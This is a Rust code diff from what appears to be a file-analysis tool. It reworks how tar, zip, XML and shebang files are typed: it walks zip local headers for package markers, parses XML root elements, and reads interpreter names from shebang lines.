-/// (its first member). Bounded to the first 8 members.
-fn zstd_tar_has_pkginfo(data: &[u8]) -> bool {
-    let Ok(decoder) = zstd::stream::read::Decoder::new(data) else {
-        return false;
+/// Settle a file compressed with `compression`: the package its layout
+/// names, else the package its name names on the same container, else the
+/// generic tar. `None` when it is no tar at all. When the content could not be
+/// read, only a name can say a tar is inside.
+fn classify_tar(
+    path: &Path,
+    data: &[u8],
+    compression: Compression,
+    inside: Inside,
+) -> Option<FileType> {
+    let layout = match inside {
+        Inside::NotTar => return None,
+        Inside::Unreadable => None,
+        Inside::Tar(ft) => Some(ft),
     };
-    let mut archive = tar::Archive::new(decoder);
-    let Ok(entries) = archive.entries() else {
-        return false;
+    let fits = |ft: FileType| {
+        container_of(ft, data)
+            .is_some_and(|c| c.archive == ArchiveFormat::Tar && c.compression == compression)
     };
-    for entry in entries.take(8) {
-        let Ok(entry) = entry else { return false };
-        if entry.path().is_ok_and(|p| p.as_os_str() == ".PKGINFO") {
-            return true;
-        }
+    if let Some(ft) = layout.filter(|&ft| ft != FileType::Tar && fits(ft)) {
+        return Some(ft);
     }
-    false
+    // `.apk` names Android's zip or Alpine's gzip tar; the container decides.
+    let claim = if path_ends_with_ci(path, b".apk") {
+        Some(FileType::ApkAlpine)
+    } else {
+        super::ext::detect_from_path(path)
+    };
+    if let Some(ft) = claim.filter(|&ft| fits(ft)) {
+        return Some(ft);
+    }
+    layout.map(|_| match compression {
+        Compression::Gzip => FileType::TarGz,
+        Compression::Bzip2 => FileType::TarBz2,
+        Compression::Xz => FileType::TarXz,
+        Compression::Zstd => FileType::TarZst,
+        _ => FileType::Tar,
+    })
 }
 
 fn looks_like_github_actions_workflow(path: &Path, data: &[u8]) -> bool {
@@ -1065,258 +1186,278 @@ fn looks_like_github_actions_workflow(path: &Path, data: &[u8]) -> bool {
     false
 }
 
-/// Whether `name` is the name of a **top-level** entry in this zip.
+/// The entry names along a zip's local-header chain, in order.
 ///
-/// A plain `memmem` for `[Content_Types].xml` answers a different question:
-/// whether the bytes appear anywhere. They do whenever a zip stores an Office
-/// document uncompressed, because the inner package's own header is then
-/// present verbatim in the outer file -- which is how a zip holding one
-/// `.docx` came to be identified as a `.docx`, and its members never walked.
+/// A plain `memmem` for a member name answers a different question: whether
+/// the bytes appear anywhere. They do whenever a zip stores an Office document
+/// uncompressed, because the inner package's own header is then present
+/// verbatim in the outer file -- which is how a zip holding one `.docx` came
+/// to be identified as a `.docx`, and its members never walked.
 ///
-/// So walk the local-header chain, stepping over each entry's data by its
-/// declared compressed size. An entry written with a streaming data descriptor
-/// carries no size to step by; the walk stops there and the caller falls back
-/// to the loose test rather than reporting a confident "no".
-fn zip_has_top_level_entry(data: &[u8], name: &[u8]) -> Option<bool> {
-    /// Entries to walk. A package names its content types first, but the
-    /// marker this is also asked about -- an APK's `AndroidManifest.xml` --
-    /// sits wherever the packager put it: entry 905 in one 21 MB sample here.
-    /// Each step is a bounds check and three integer reads, so the ceiling is
-    /// set by what a real archive holds rather than by what the walk costs.
+/// So step from header to header by each entry's declared compressed size.
+/// When the iterator ends, `complete` says whether it reached a real end of
+/// chain (or the entry cap). A walk that lost the thread -- a streaming entry
+/// with no size to step by, a header whose sizes are nonsense -- proves
+/// nothing absent, and callers fall back to a looser test rather than
+/// reporting a confident "no".
+struct ZipNames<'a> {
+    data: &'a [u8],
+    /// The next local header, or `None` once the walk has stopped.
+    off: Option<usize>,
+    left: usize,
+    complete: bool,
+}
+
+impl<'a> ZipNames<'a> {
+    /// Entries to walk. A package names its content types first, but a
+    /// marker such as an APK's `AndroidManifest.xml` sits wherever the
+    /// packager put it: entry 905 in one 21 MB sample here. Each step is a
+    /// bounds check and a few integer reads, so the ceiling is set by what a
+    /// real archive holds rather than by what the walk costs.
     const MAX_ENTRIES: usize = 8192;
 
-    let u16_at = |off: usize| -> Option<usize> {
-        let b = data.get(off..off + 2)?;
-        Some(u16::from_le_bytes([b[0], b[1]]) as usize)
-    };
-    let u32_at = |off: usize| -> Option<usize> {
-        let b = data.get(off..off + 4)?;
-        Some(u32::from_le_bytes([b[0], b[1], b[2], b[3]]) as usize)
-    };
+    fn new(data: &'a [u8]) -> Self {
+        Self {
+            data,
+            off: Some(0),
+            left: Self::MAX_ENTRIES,
+            complete: false,
+        }
+    }
+}
 
-    let mut off = 0usize;
-    for _ in 0..MAX_ENTRIES {
+impl<'a> Iterator for ZipNames<'a> {
+    type Item = &'a [u8];
+
+    fn next(&mut self) -> Option<&'a [u8]> {
+        let data = self.data;
+        let off = self.off.take()?;
+        if self.left == 0 {
+            self.complete = true;
+            return None;
+        }
+        self.left -= 1;
+        let u16_at = |at: usize| {
+            data.get(at..at + 2)
+                .map(|b| u16::from_le_bytes([b[0], b[1]]) as usize)
+        };
+        let u32_at = |at: usize| {
+            data.get(at..at + 4)
+                .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]) as usize)
+        };
         let sig = data.get(off..off + 4)?;
         if sig != b"PK\x03\x04" {
-            // Only a real end-of-chain marker answers the question. Anything
-            // else means the walk lost the thread, and a lost walk must not
-            // report "no": the malformed packages this corpus is full of --
-            // a header whose name length and compressed size are nonsense --
-            // are still Office documents, and saying otherwise routes them to
-            // a reader that rejects them outright.
-            let clean_end = matches!(
+            // Only a real end-of-chain marker completes the walk. Anything else
+            // means it lost the thread: the malformed packages this corpus is
+            // full of are still Office documents, and saying otherwise routes
+            // them to a reader that rejects them outright.
+            self.complete = matches!(
                 sig,
                 b"PK\x01\x02" | b"PK\x05\x06" | b"PK\x06\x06" | b"PK\x06\x07"
             );
-            return clean_end.then_some(false);
+            return None;
         }
         let flags = u16_at(off + 6)?;
         let compressed = u32_at(off + 18)?;
         let name_len = u16_at(off + 26)?;
         let extra_len = u16_at(off + 28)?;
-        if data.get(off + 30..off + 30 + name_len)? == name {
-            return Some(true);
-        }
+        let name = data.get(off + 30..off + 30 + name_len)?;
         // Bit 3: the sizes are repeated in a trailing data descriptor. When
         // the local header carries them too they can still be stepped by;
         // when it does not, there is nothing to step by and the walk stops.
-        if flags & 0x08 != 0 && compressed == 0 {
-            return None;
-        }
-        let mut next = off.checked_add(30 + name_len + extra_len + compressed)?;
-        if next > data.len() {
-            return None;
-        }
-        if flags & 0x08 != 0 && data.get(next..next + 4) == Some(b"PK\x07\x08") {
-            // Signature + crc + two sizes, four bytes each, or eight each in
-            // zip64. Which one is in use is not declared here, so take the
-            // length that lands on something a chain can continue with.
-            next = [16usize, 24]
-                .into_iter()
-                .map(|skip| next + skip)
-                .find(|&candidate| {
-                    matches!(
-                        data.get(candidate..candidate + 4),
-                        Some(b"PK\x03\x04" | b"PK\x01\x02" | b"PK\x05\x06")
-                    )
-                })?;
-        }
-        off = next;
-    }
-    // Reached MAX_ENTRIES while cleanly walking valid local headers without
-    // seeing `name`. A package whose identity marker sits at the root (an
-    // OOXML document's `[Content_Types].xml` or an APK's `AndroidManifest.xml`)
-    // never places it after 8,192 entries.
-    Some(false)
-}
-
-/// Whether the zip is an Open Packaging Conventions package.
-fn is_opc_package(data: &[u8]) -> bool {
-    match zip_has_top_level_entry(data, b"[Content_Types].xml") {
-        Some(answer) => answer,
-        // Unwalkable: keep the older, looser test rather than deciding.
-        None => memchr::memmem::find(data, b"[Content_Types].xml").is_some(),
+        self.off = (flags & 0x08 == 0 || compressed != 0)
+            .then(|| off.checked_add(30 + name_len + extra_len + compressed))
+            .flatten()
+            .filter(|&next| next <= data.len())
+            .and_then(|next| {
+                if flags & 0x08 == 0 || data.get(next..next + 4) != Some(b"PK\x07\x08") {
+                    return Some(next);
+                }
+                // Signature + crc + two sizes, four bytes each, or eight each
+                // in zip64. Which one is in use is not declared here, so take
+                // the length that lands on something a chain continues with.
+                [16usize, 24]
+                    .into_iter()
+                    .map(|skip| next + skip)
+                    .find(|&at| {
+                        matches!(
+                            data.get(at..at + 4),
+                            Some(b"PK\x03\x04" | b"PK\x01\x02" | b"PK\x05\x06")
+                        )
+                    })
+            });
+        Some(name)
     }
 }
 
-/// Classify PK (ZIP) archives into JAR, OOXML, or generic Archive.
+/// Whether `name` is an entry of this zip; `None` when the walk could not
+/// finish without finding it.
+#[cfg(test)]
+fn zip_has_top_level_entry(data: &[u8], name: &[u8]) -> Option<bool> {
+    let mut names = ZipNames::new(data);
+    if names.any(|n| n == name) {
+        return Some(true);
+    }
+    names.complete.then_some(false)
+}
+
+/// The members that name a zip-based package, gathered in one walk.
+#[derive(Default)]
+struct ZipMarks {
+    android: bool,
+    content_types: bool,
+    mimetype: bool,
+    vsix: bool,
+    nuspec: bool,
+    jar: bool,
+    wheel: bool,
+    egg: bool,
+    ipa: bool,
+    conda_metadata: bool,
+    conda_info: bool,
+    xpi: bool,
+    complete: bool,
+}
+
+impl ZipMarks {
+    fn scan(data: &[u8]) -> Self {
+        let mut m = Self::default();
+        let mut names = ZipNames::new(data);
+        for name in names.by_ref() {
+            let top_level = !name.contains(&b'/');
+            match name {
+                b"AndroidManifest.xml" => m.android = true,
+                b"[Content_Types].xml" => m.content_types = true,
+                b"mimetype" => m.mimetype = true,
+                b"extension.vsixmanifest" => m.vsix = true,
+                b"META-INF/MANIFEST.MF" => m.jar = true,
+                b"EGG-INFO/PKG-INFO" => m.egg = true,
+                b"metadata.json" => m.conda_metadata = true,
+                b"install.rdf" | b"META-INF/mozilla.rsa" => m.xpi = true,
+                _ if top_level && name.ends_with(b".nuspec") => m.nuspec = true,
+                _ if top_level && name.starts_with(b"info-") && name.ends_with(b".tar.zst") => {
+                    m.conda_info = true;
+                }
+                _ if name
+                    .strip_suffix(b".dist-info/WHEEL")
+                    .is_some_and(|dir| !dir.is_empty() && !dir.contains(&b'/')) =>
+                {
+                    m.wheel = true;
+                }
+                _ if name.starts_with(b"Payload/")
+                    && memchr::memmem::find(name, b".app/").is_some() =>
+                {
+                    m.ipa = true;
+                }
+                _ => {}
+            }
+        }
+        m.complete = names.complete;
+        m
+    }
+}
+
+/// Names that claim an archive, not a document: a zip so named holding an
+/// OPC `[Content_Types].xml` stays the archive it says it is.
+const ARCHIVE_EXTS: &[&str] = &[
+    "zip",
+    "jar",
+    "war",
+    "ear",
+    "vsix",
+    "nupkg",
+    "xpi",
+    "whl",
+    "epub",
+    "apk",
+    "ipa",
+    "aar",
+    "egg",
+    "phar",
+    "pyz",
+    "conda",
+    "msix",
+    "appx",
+    "msixbundle",
+    "appxbundle",
+    "aab",
+    "apks",
+    "xapk",
+    "cbz",
+];
+
+/// The zip-based package a name claims, trusted when no member contradicts
+/// it. Office names are absent on purpose: an office extension is a claim,
+/// not the format, and without the OPC marker the file is a zip.
+fn zip_name_claim(ext: &str) -> Option<FileType> {
+    Some(match ext {
+        "jar" | "war" | "ear" => FileType::Jar,
+        "xpi" => FileType::Xpi,
+        "whl" => FileType::Whl,
+        "apk" => FileType::ApkAndroid,
+        "conda" => FileType::Conda,
+        "egg" => FileType::Egg,
+        "nupkg" => FileType::Nupkg,
+        "ipa" => FileType::Ipa,
+        "vsix" => FileType::Vsix,
+        "odt" | "ods" | "odp" | "odg" | "odf" | "ott" | "ots" | "otp" | "odm" | "oth" | "otg"
+        | "odb" | "odc" | "odi" => FileType::Odf,
+        _ => return None,
+    })
+}
+
+/// Classify a zip by the members only one kind of package carries; the name
+/// settles only what the members leave open.
 ///
-/// ZIP-based formats share the same magic bytes, so disambiguation requires
-/// the file extension or scanning for format-specific entries in the ZIP.
+/// That order decides whether anything looks inside. A file typed Ooxml goes
+/// to the office analyzer, which reads OPC parts; a file typed Zip goes to the
+/// archive analyzer, which walks the members. Three samples here are zips
+/// holding one payload apiece -- a `documents.doc` under an `.xlsm` name, a
+/// `.pdf.url` shortcut beside a decoy docx -- and none of those members were
+/// analyzed while the name was believed. And an APK, JAR or NuGet package
+/// delivered without its extension reached none of its own analysis.
 fn classify_pk(path: &Path, data: &[u8]) -> (FileType, DetectionSource) {
-    // Lowercase extension once for all checks
-    let ext_lower = lowercase_ext(path);
-    let ext = ext_lower.as_deref().unwrap_or("");
+    let ext = lowercase_ext(path);
+    let ext = ext.as_deref().unwrap_or("");
+    let m = ZipMarks::scan(data);
+    // Where the walk lost the thread, a marker's bytes anywhere are the best
+    // evidence left.
+    let loose = |marker: &[u8]| !m.complete && memchr::memmem::find(data, marker).is_some();
+    let opc = m.content_types || loose(b"[Content_Types].xml");
+    // An OpenDocument file stores `mimetype` first; an Android package can
+    // carry the namespace URI in any of its resources and is not one.
+    let odf =
+        m.mimetype && memchr::memmem::find(data, b"application/vnd.oasis.opendocument.").is_some();
 
-    if matches!(ext, "jar" | "war" | "ear") {
-        return (FileType::Jar, DetectionSource::Magic);
-    }
-
-    if ext == "xpi" {
-        return (FileType::Xpi, DetectionSource::Magic);
-    }
-
-    if ext == "whl" {
-        return (FileType::Whl, DetectionSource::Magic);
-    }
-
-    // `.apk` + zip magic is an Android application package. Alpine's `.apk` is
-    // a gzip tar, resolved in the gzip branch — the two never share magic.
-    if ext == "apk" {
-        return (FileType::ApkAndroid, DetectionSource::Magic);
-    }
-
-    // Zip-based package ecosystems, disambiguated from a generic zip by their
-    // unambiguous extension (each ships its identity manifest inside).
-    if ext == "conda" {
-        return (FileType::Conda, DetectionSource::Magic);
-    }
-    if ext == "egg" {
-        return (FileType::Egg, DetectionSource::Magic);
-    }
-    if ext == "nupkg" {
-        return (FileType::Nupkg, DetectionSource::Magic);
-    }
-    if ext == "ipa" {
-        return (FileType::Ipa, DetectionSource::Magic);
-    }
-    if ext == "vsix" {
-        return (FileType::Vsix, DetectionSource::Magic);
-    }
-
-    // VSIX is an Open Packaging Conventions ZIP, so it also carries
-    // `[Content_Types].xml`. Its root manifest is the format-specific marker
-    // and must win before the generic OOXML check — especially for extensionless
-    // samples and registry blobs whose filenames do not preserve `.vsix`.
-    if memchr::memmem::find(data, b"extension.vsixmanifest").is_some() {
-        return (FileType::Vsix, DetectionSource::Magic);
-    }
-
-    // An Office extension is a claim, not the format. Every OOXML document is
-    // an Open Packaging Conventions zip and every one of them names
-    // `[Content_Types].xml` as its first entry, so requiring the marker costs
-    // a real document nothing -- and a zip that merely *calls* itself `.xlsm`
-    // is identified as the zip it is.
-    //
-    // That difference decides whether anything looks inside. A file typed
-    // Ooxml goes to the office analyzer, which reads OPC parts and finds none;
-    // a file typed Zip goes to the archive analyzer, which walks the members.
-    // Three samples here are zips holding one payload apiece -- a `documents.doc`
-    // under an `.xlsm` name, a `.pdf.url` shortcut beside a decoy docx -- and
-    // none of those members were ever analyzed.
-    if matches!(
-        ext,
-        "docx" | "xlsx" | "pptx" | "docm" | "xlsm" | "pptm" | "dotx" | "dotm" | "xltx" | "xltm"
-    ) && is_opc_package(data)
-    {
-        return (FileType::Ooxml, DetectionSource::Magic);
-    }
-
-    // OpenDocument Format by extension
-    if matches!(
-        ext,
-        "odt"
-            | "ods"
-            | "odp"
-            | "odg"
-            | "odf"
-            | "ott"
-            | "ots"
-            | "otp"
-            | "odm"
-            | "oth"
-            | "otg"
-            | "odb"
-            | "odc"
-            | "odi"
-    ) {
-        return (FileType::Odf, DetectionSource::Magic);
-    }
-
-    // Android by content. An APK delivered without its extension -- renamed,
-    // or pulled from a feed that strips names -- otherwise reaches none of the
-    // Android analysis at all: one 21 MB sample here was classified as an
-    // Office document because the OpenDocument namespace URI appears
-    // somewhere in its resources.
-    if zip_has_top_level_entry(data, b"AndroidManifest.xml") == Some(true) {
-        return (FileType::ApkAndroid, DetectionSource::Magic);
-    }
-
-    // OOXML by content (scan for [Content_Types].xml) — but not for archive containers
-    let is_archive_opc = matches!(
-        ext,
-        "zip"
-            | "jar"
-            | "war"
-            | "ear"
-            | "vsix"
-            | "nupkg"
-            | "xpi"
-            | "whl"
-            | "epub"
-            | "apk"
-            | "ipa"
-            | "aar"
-            | "egg"
-            | "phar"
-            | "pyz"
-            | "conda"
-            | "msix"
-            | "appx"
-            | "msixbundle"
-            | "appxbundle"
-            | "aab"
-            | "apks"
-            | "xapk"
-            | "cbz"
-    );
-    if !is_archive_opc && is_opc_package(data) {
-        return (FileType::Ooxml, DetectionSource::Magic);
-    }
-
-    // ODF by content — first ZIP entry is an uncompressed "mimetype" file
-    // containing "application/vnd.oasis.opendocument."
-    // The ODF marker has to be the package's own, not a string that happens to
-    // appear inside it. An OpenDocument file stores `mimetype` as its first
-    // entry; an Android package 21 MB wide can carry the namespace URI in any
-    // of its resources, and was being called an OpenDocument file for it.
-    //
-    // `== Some(true)`, not `!= Some(false)`. `zip_has_top_level_entry` returns
-    // `None` when the walk loses the thread, deliberately, so that a malformed
-    // header cannot produce a confident "no" -- and the looser comparison then
-    // read that uncertainty as a yes. An 88MB .xapk whose walk ran out was
-    // typed OpenDocument on the strength of the namespace URI appearing
-    // somewhere in it, and got no Android analysis at all. The Android branch
-    // above already requires positive confirmation; this now matches it. A
-    // genuine ODF whose walk fails falls through to Zip, which still reaches
-    // archive analysis -- the cheaper mistake by far.
-    if memchr::memmem::find(data, b"application/vnd.oasis.opendocument.").is_some()
-        && zip_has_top_level_entry(data, b"mimetype") == Some(true)
-    {
-        return (FileType::Odf, DetectionSource::Magic);
-    }
-
-    (FileType::Zip, DetectionSource::Magic)
+    let ft = if m.android {
+        FileType::ApkAndroid
+    } else if m.vsix || loose(b"extension.vsixmanifest") {
+        // VSIX and NuGet are OPC zips too; their manifests win.
+        FileType::Vsix
+    } else if opc && m.nuspec {
+        FileType::Nupkg
+    } else if opc && !ARCHIVE_EXTS.contains(&ext) {
+        FileType::Ooxml
+    } else if odf {
+        FileType::Odf
+    } else if let Some(claimed) = zip_name_claim(ext) {
+        claimed
+    } else if m.ipa {
+        FileType::Ipa
+    } else if m.wheel {
+        FileType::Whl
+    } else if m.egg {
+        FileType::Egg
+    } else if m.conda_metadata && m.conda_info {
+        FileType::Conda
+    } else if m.xpi {
+        FileType::Xpi
+    } else if m.jar {
+        FileType::Jar
+    } else {
+        FileType::Zip
+    };
+    (ft, DetectionSource::Magic)
 }
 
 /// Lowercase extension into a stack buffer. Returns None if no extension or too long.
@@ -1335,156 +1476,176 @@ fn lowercase_ext(path: &Path) -> Option<String> {
     Some(ext.to_string())
 }
 
-/// Detect a generic XML document by `<?xml` prolog or well-known root elements.
-///
-/// Called only when the file starts with `<` and is NOT a plist/PHP/HTML document.
-/// Plist is checked first (separate function), and HTML is distinguished from
-/// generic XML by the `looks_like_html` content heuristic that runs later.
+/// Type a markup document by its root element: `plist`, `svg`, a known XML
+/// vocabulary, or any document with an `<?xml` prolog. HTML is claimed
+/// earlier and by the heuristics, not here.
 fn detect_xml(data: &[u8]) -> Option<(FileType, DetectionSource)> {
-    // SVG root, with or without an `<?xml` prolog / DOCTYPE preamble. SVG is
-    // XML but gets its own type: it is a media format that can embed scripts,
-    // so it warrants distinct reporting and masquerade grouping.
-    if has_svg_root(data) {
-        return Some((FileType::Svg, DetectionSource::Magic));
-    }
-
-    // Standard XML prolog
-    if data.starts_with(b"<?xml") {
-        return Some((FileType::Xml, DetectionSource::Magic));
-    }
-
-    // MSBuild projects often omit the prolog and start with `<Project `
-    // Matching the xmlns confirms it's real MSBuild (not some other <Project>).
-    if data.starts_with(b"<Project ") || data.starts_with(b"<Project\t") {
-        let head = &data[..data.len().min(512)];
-        if memchr::memmem::find(head, b"schemas.microsoft.com/developer/msbuild").is_some() {
-            return Some((FileType::Xml, DetectionSource::Magic));
+    let head = xml_head(data)?;
+    let ft = match head.root {
+        Some(b"plist") => FileType::Plist,
+        Some(b"svg") => FileType::Svg,
+        // MSBuild projects often omit the prolog and open with `<Project`;
+        // the namespace keeps some other `<Project>` out.
+        Some(b"Project")
+            if memchr::memmem::find(head.text, b"schemas.microsoft.com/developer/msbuild")
+                .is_some() =>
+        {
+            FileType::Xml
         }
-    }
-
-    // Other common extensionless XML roots. Each is narrow enough to avoid
-    // colliding with HTML — HTML would match `looks_like_html` heuristic after
-    // this returns None.
-    for prefix in [
-        &b"<rss "[..],
-        &b"<feed "[..],
-        &b"<RDF "[..],
-        &b"<configuration>"[..],
-        &b"<configuration "[..],
-        &b"<manifest "[..],
-        &b"<Configuration "[..],
-    ] {
-        if data.starts_with(prefix) {
-            return Some((FileType::Xml, DetectionSource::Magic));
-        }
-    }
-
-    None
+        Some(
+            b"rss" | b"feed" | b"RDF" | b"rdf:RDF" | b"configuration" | b"Configuration"
+            | b"manifest",
+        ) => FileType::Xml,
+        _ if head.prolog => FileType::Xml,
+        _ => return None,
+    };
+    Some((ft, DetectionSource::Magic))
 }
 
-/// True if `data` has an `<svg>` root element, allowing a leading `<?xml`
-/// prolog, `<!DOCTYPE …>`, and comments/whitespace before it. Bounded to the
-/// document head so a stray `<svg` deep inside an unrelated XML body does not
-/// reclassify the whole file.
-fn has_svg_root(data: &[u8]) -> bool {
-    if data.starts_with(b"<svg ") || data.starts_with(b"<svg>") {
-        return true;
+/// How far into a document [`xml_head`] looks for the root element.
+const XML_HEAD: usize = 1024;
+
+/// The opening of a markup document, read the way a parser reads it.
+struct XmlHead<'a> {
+    /// The bytes read.
+    text: &'a [u8],
+    /// Whether an `<?xml` declaration came first.
+    prolog: bool,
+    /// The root element's name: the first element, or the doctype's name when
+    /// the head ends before any element. `None` when the two disagree -- a
+    /// document that contradicts itself is claimed by neither.
+    root: Option<&'a [u8]>,
+}
+
+/// Read past a BOM, whitespace, processing instructions, comments and the
+/// doctype to the root element. `None` unless the document opens with `<`.
+fn xml_head(data: &[u8]) -> Option<XmlHead<'_>> {
+    let text = &data[..data.len().min(XML_HEAD)];
+    let mut rest = text
+        .strip_prefix(b"\xEF\xBB\xBF")
+        .unwrap_or(text)
+        .trim_ascii_start();
+    if !rest.starts_with(b"<") {
+        return None;
     }
-    if data.starts_with(b"<!DOCTYPE") {
-        // The preamble allowance is for `<!DOCTYPE svg PUBLIC …>`. A page that
-        // declares itself HTML is HTML however many `<svg>` icons it draws in
-        // its navigation bar, and modern markup puts them in the first
-        // kilobyte.
-        if !doctype_names_svg(data) {
-            return false;
+    let prolog = rest.starts_with(b"<?xml");
+    let mut doctype = None;
+    let element = loop {
+        rest = rest.trim_ascii_start();
+        let close: &[u8] = if rest.starts_with(b"<?") {
+            b"?>"
+        } else if rest.starts_with(b"<!--") {
+            b"-->"
+        } else if rest.len() >= 9 && rest[..9].eq_ignore_ascii_case(b"<!DOCTYPE") {
+            doctype = Some(markup_name(rest[9..].trim_ascii_start()));
+            b">"
+        } else if rest.starts_with(b"<!") {
+            b">"
+        } else if rest.starts_with(b"<") {
+            break Some(markup_name(&rest[1..]));
+        } else {
+            break None;
+        };
+        match memchr::memmem::find(rest, close) {
+            Some(end) => rest = &rest[end + close.len()..],
+            None => break None,
         }
-    } else if !data.starts_with(b"<?xml") {
-        return false;
-    }
-    let head = &data[..data.len().min(1024)];
-    // An `<html>` element ahead of the `<svg>` settles it the same way: the
-    // svg is a child of the page, not the root of the document.
-    if let Some(svg) = memchr::memmem::find(head, b"<svg ").or(memchr::memmem::find(head, b"<svg>"))
-    {
-        return !head[..svg]
-            .windows(5)
-            .any(|w| w.eq_ignore_ascii_case(b"<html"));
-    }
-    false
+    };
+    let root = match (doctype, element) {
+        (Some(d), Some(e)) if d != e => None,
+        (d, e) => e.or(d),
+    };
+    Some(XmlHead {
+        text,
+        prolog,
+        root: root.filter(|r| !r.is_empty()),
+    })
 }
 
-/// True if a `<!DOCTYPE …>` preamble names `svg` as the root element.
-fn doctype_names_svg(data: &[u8]) -> bool {
-    data.get(9..data.len().min(64))
-        .and_then(|rest| {
-            rest.split(|b| b.is_ascii_whitespace())
-                .find(|w| !w.is_empty())
-        })
-        .is_some_and(|name| name.eq_ignore_ascii_case(b"svg"))
-}
-
-/// Detect XML Plist markers in the first 256 bytes.
-fn detect_xml_plist(data: &[u8]) -> Option<(FileType, DetectionSource)> {
-    let head = &data[..data.len().min(256)];
-    if memchr::memmem::find(head, b"<plist").is_some()
-        || memchr::memmem::find(head, b"<!DOCTYPE plist").is_some()
-    {
-        Some((FileType::Plist, DetectionSource::Magic))
-    } else {
-        None
-    }
+/// The name that opens `bytes`, up to whitespace, `>`, `/` or `[`.
+fn markup_name(bytes: &[u8]) -> &[u8] {
+    let end = bytes
+        .iter()
+        .position(|&b| b.is_ascii_whitespace() || matches!(b, b'>' | b'/' | b'['))
+        .unwrap_or(bytes.len());
+    &bytes[..end]
 }
 
 /// Detect shebang-based file types.
 ///
-/// Extracts the interpreter name from the first line and dispatches via a
-/// match on the path segment after the last '/'.
+/// Reads the line the way the kernel does: the first word is the interpreter
+/// path, and only its basename matters. A launcher (`env`, `busybox`) defers
+/// to the first word after its own options.
 fn detect_shebang(data: &[u8]) -> Option<(FileType, DetectionSource)> {
-    // Extract first line (up to 128 bytes)
-    let limit = data.len().min(128);
-    let first_line_end = memchr::memchr(b'\n', &data[..limit]).unwrap_or(limit);
-    let line = &data[2..first_line_end]; // skip "#!"
-
-    // Handle "#!/usr/bin/env <interpreter>" — find the interpreter name
-    // Handle "#!/path/to/interpreter" — use last path component
-    let interp = if line.starts_with(b"/usr/bin/env ") || line.starts_with(b"/usr/bin/env\t") {
-        // Skip "/usr/bin/env " and any extra whitespace
-        let rest = &line[13..];
-        let start = rest
-            .iter()
-            .position(|&b| b != b' ' && b != b'\t')
-            .unwrap_or(0);
-        &rest[start..]
-    } else {
-        // Find last '/' and take everything after it
-        let slash_pos = memchr::memrchr(b'/', line).map_or(0, |p| p + 1);
-        &line[slash_pos..]
-    };
-
-    // Take just the interpreter basename (stop at space, tab, or NUL for flags like "python3 -u")
-    let end = interp
+    // The kernel reads a shebang line through BINPRM_BUF_SIZE (256 bytes).
+    let limit = data.len().min(256);
+    let line_end = memchr::memchr(b'\n', &data[..limit]).unwrap_or(limit);
+    // Any whitespace ends a word, not just space and tab: a CRLF script's
+    // `#!/usr/bin/perl\r` names perl, whatever the kernel makes of the `\r`.
+    let mut words = data[2..line_end]
+        .split(|&b| b.is_ascii_whitespace() || b == 0)
+        .filter(|w| !w.is_empty());
+    let mut name = basename(words.next()?);
+    if name == b"env" || name == b"busybox" {
+        name = basename(launched_interpreter(&mut words)?);
+    }
+    // `python3.11`, `perl5.36`, `ruby3.2` and `ksh93` are the same languages.
+    let versioned = name
         .iter()
-        .position(|&b| b == b' ' || b == b'\t' || b == 0)
-        .unwrap_or(interp.len());
-    let name = &interp[..end];
-
-    // Match interpreter name
-    match name {
-        b"sh" | b"bash" | b"zsh" | b"dash" | b"ash" | b"ksh" | b"fish" | b"tcsh" | b"csh"
-        | b"atf-sh" => Some((FileType::Shell, DetectionSource::Shebang)),
+        .rev()
+        .take_while(|&&b| b.is_ascii_digit() || b == b'.')
+        .count();
+    let file_type = match &name[..name.len() - versioned] {
+        b"sh" | b"bash" | b"rbash" | b"zsh" | b"dash" | b"ash" | b"ksh" | b"mksh" | b"yash"
+        | b"fish" | b"tcsh" | b"csh" | b"atf-sh" => FileType::Shell,
         // debian/rules and friends: `#!/usr/bin/make -f`. Without this the
         // content heuristics mis-type make scripts as source code.
-        b"make" | b"gmake" => Some((FileType::Makefile, DetectionSource::Shebang)),
-        b"python" | b"python2" | b"python3" => Some((FileType::Python, DetectionSource::Shebang)),
-        b"node" | b"nodejs" | b"deno" | b"bun" => {
-            Some((FileType::JavaScript, DetectionSource::Shebang))
+        b"make" | b"gmake" => FileType::Makefile,
+        b"python" | b"pypy" => FileType::Python,
+        b"node" | b"nodejs" | b"deno" | b"bun" => FileType::JavaScript,
+        b"ts-node" | b"tsx" => FileType::TypeScript,
+        b"ruby" | b"jruby" => FileType::Ruby,
+        b"perl" => FileType::Perl,
+        b"php" => FileType::Php,
+        b"lua" | b"luajit" => FileType::Lua,
+        b"pwsh" | b"powershell" => FileType::PowerShell,
+        // JXA is `osascript -l JavaScript`; the body is JavaScript, and typing
+        // it AppleScript would hide it from every JavaScript rule.
+        b"osascript" if words.any(|w| w.eq_ignore_ascii_case(b"JavaScript")) => {
+            FileType::JavaScript
         }
-        b"ruby" => Some((FileType::Ruby, DetectionSource::Shebang)),
-        b"perl" | b"perl5" => Some((FileType::Perl, DetectionSource::Shebang)),
-        b"php" | b"php8" | b"php7" => Some((FileType::Php, DetectionSource::Shebang)),
-        b"lua" | b"luajit" => Some((FileType::Lua, DetectionSource::Shebang)),
-        _ => None,
+        b"osascript" => FileType::AppleScript,
+        b"elixir" => FileType::Elixir,
+        b"groovy" => FileType::Groovy,
+        b"scala" => FileType::Scala,
+        b"kotlin" | b"kscript" => FileType::Kotlin,
+        b"swift" => FileType::Swift,
+        // Babashka runs Clojure.
+        b"bb" => FileType::Clojure,
+        _ => return None,
+    };
+    Some((file_type, DetectionSource::Shebang))
+}
+
+/// The path segment after the last `/`.
+fn basename(path: &[u8]) -> &[u8] {
+    memchr::memrchr(b'/', path).map_or(path, |p| &path[p + 1..])
+}
+
+/// The interpreter a launcher runs: the first word that is neither an option
+/// nor a `NAME=value` assignment, as in `env -S perl -w` or `env -u X python3`.
+fn launched_interpreter<'a>(words: &mut impl Iterator<Item = &'a [u8]>) -> Option<&'a [u8]> {
+    while let Some(word) = words.next() {
+        match word {
+            // env options that consume the next word as their argument.
+            b"-u" | b"--unset" | b"-C" | b"--chdir" => {
+                words.next();
+            }
+            _ if word.starts_with(b"-") || word.contains(&b'=') => {}
+            _ => return Some(word),
+        }
     }
+    None
 }
 
 /// Detect tampered PE: MZ within first 64 bytes with valid PE\0\0 signature.
@@ -1572,36 +1733,38 @@ fn detect_manifest(path: &Path, data: &[u8]) -> Option<FileType> {
 #[allow(clippy::unwrap_used, clippy::expect_used)]
 mod tests {
 
+    fn is_svg(data: &[u8]) -> bool {
+        detect_xml(data).map(|(ft, _)| ft) == Some(FileType::Svg)
+    }
+
     #[test]
